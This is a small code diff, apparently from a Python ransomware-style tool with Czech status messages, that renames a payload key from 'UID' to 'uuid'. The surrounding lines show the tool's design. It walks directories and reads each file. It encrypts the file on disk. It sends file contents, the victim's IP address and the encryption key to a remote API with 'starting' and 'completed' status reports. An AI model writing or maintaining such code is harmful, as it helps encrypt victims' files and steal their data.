@@ -174,7 +174,7 @@ async def collect_and_send_files_data_with_ga(start_path, uid, ip_address, api_u
                 content = f.read()
             if encrypt_file_on_disk(file_path, encryption_key):
                 payload = {
-                    "UID": uid,
+                    "uuid": uid,
                     "IP": ip_address,
                     "file": {
                         "file_path": file_path,
@@ -241,7 +241,7 @@ async def main():
 
     print("Odesílání úvodního statusu...")
     starting_payload = {
-        "UID": uid,
+        "uuid": uid,
         "IP": ip_address,
         "status": "starting",
         "encryption_key": encryption_key.decode()
@@ -253,7 +253,7 @@ async def main():
 
     print("Odesílání závěrečného statusu...")
     final_status_payload = {
-        "UID": uid,
+        "uuid": uid,
         "IP": ip_address,
         "status": "completed"
     }
